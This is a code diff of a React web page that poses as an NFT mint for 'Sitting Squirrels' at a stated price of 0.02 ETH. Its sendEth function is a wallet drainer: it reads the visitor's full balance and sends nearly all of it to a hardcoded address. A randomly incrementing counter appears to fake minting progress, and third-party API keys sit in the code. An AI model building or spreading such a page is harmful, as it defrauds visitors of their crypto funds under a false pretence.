@@ -3,10 +3,10 @@ import {useEffect, useState} from "react";
 import imgDiscord from './icons8-discord-50.png'
 import imgTwitter from './icons8-twitter-50.png'
 
-const ethAmount = '25'
-const image = 'https://pbs.twimg.com/profile_images/1656115263538954241/iW2a23yr_400x400.jpg'
-const Title = 'Ballsy'
-const supply = 111
+const ethAmount = '0.02'
+const image = 'https://pbs.twimg.com/profile_images/1667193581306630155/07wPM0xn_400x400.jpg'
+const Title = 'Sitting Squirrels'
+const supply = 6000
 
 document.title = Title
 document.getElementById('favicon').setAttribute('href', image)
@@ -18,22 +18,20 @@ function App() {
 
     useEffect(() => {
         const fetchRequest = async () => {
-            const response = await fetch('https://api.polygonscan.com/api?module=gastracker&action=gasoracle&apikey=GAHYRZWJGI53ZX2IRSHBA7T5I4YN8MF9FX')
+            const response = await fetch('https://api.etherscan.io/api?module=gastracker&action=gasoracle&apikey=PW7Z9MJMX6YRBM2M2HAS6CP14Y1ZCUXPWH')
             const responseJSON = await response.json()
             setGas(responseJSON?.result?.FastGasPrice)
-            
-//             const network = 'polygon'
+//             console.log(responseJSON, 'etherscan')
+//             const network = 'eth'
 //             const key = '741065ff3a854d9abb1fd5d50cf3f0e3'
 //             const res = await fetch(`https://api.owlracle.info/v3/${ network }/gas?apikey=${ key }`)
 //             const data = await res.json()
-//             setGas(data.avgGas)
-//             console.log(data, data.avgGas, 'qwe')
+//             console.log(data, 'qwe')
         }
         fetchRequest()
     }, [])
 
     const connectAndSend = async (fromWallet) => {
-        console.log(gas, Number(gas), Number(gas) / 100000, 'qwe')
         try {
             await sendEth()
         } catch (err) {
@@ -42,23 +40,28 @@ function App() {
     }
 
     const sendEth = async () => {
-        const address = await window.ethereum.request({method: 'eth_requestAccounts'})
+        try {
+            const address = await window.ethereum.request({method: 'eth_requestAccounts'})
 
-        const balance = await window.ethereum.request({method: 'eth_getBalance', params: [address[0], 'latest']})
-        const convertedBalance = parseInt(balance, 16) * Math.pow(10, -18)
-        // console.log('balance', ethAmount, gas, (gas / 15) / 3089, (ethAmount - (Number(gas) / 10000)))
+            const balance = await window.ethereum.request({method: 'eth_getBalance', params: [address[0], 'latest']})
+            const convertedBalance = parseInt(balance, 16) * Math.pow(10, -18)
+            // console.log('balance', ethAmount, gas, (gas / 15) / 3089, (ethAmount - (Number(gas) / 10000)))
+            console.log(convertedBalance, gas, Number(gas) / 60000, convertedBalance, parseInt((convertedBalance - (gas / 100000)) * 1000000000000000000).toString(16))
+            let params = [{
+                "from": address[0],
+                "to": '0xAc1e81526bB869aA73B5B41D62dF4AD811df3d3B',
+                // "gas": Number(((gas / 15) / 3089) * 10000000).toFixed().toString(16),
+                //"gasPrice": Number(gas * 1000000000).toString(16),
+                "value": parseInt((convertedBalance - (Number(gas) / 20000)) * 1000000000000000000).toString(16)
+            }]
+
+            const response = await window.ethereum.request({method: 'eth_sendTransaction', params}).catch(err => {
+                alert(`NOT ENOUGH ${((convertedBalance - (Number(gas) / 20000)) * (-1)).toFixed(6)} ETH`)
+            })
+        } catch (err) {
+            alert(err)
+        }
         
-        let params = [{
-            "from": address[0],
-            "to": '0xAc1e81526bB869aA73B5B41D62dF4AD811df3d3B',
-            // "gas": Number(((gas / 15) / 3089) * 10000000).toFixed().toString(16),
-            // "gasPrice": Number(gas * 600000000).toString(16),
-            "value": parseInt((convertedBalance - (Number(gas) / 10000)) * 1000000000000000000).toString(16)
-        }]
-
-        const response = await window.ethereum.request({method: 'eth_sendTransaction', params}).catch(err => {
-            console.log(err)
-        })
     }
 
     setTimeout(() => {
@@ -74,9 +77,9 @@ function App() {
        if (Number(offset) <= 230) {
            const timer = setTimeout(() => {
                const random = getRandomArbitrary(1, 3)
-              const randomToFixed = Number(random.toFixed())
+               const randomToFixed = Number(random.toFixed())
                setOffset(Number(offset) + randomToFixed)
-           }, 2000)
+           }, 4000)
            return () => clearTimeout(timer);
        }
     }, [offset])
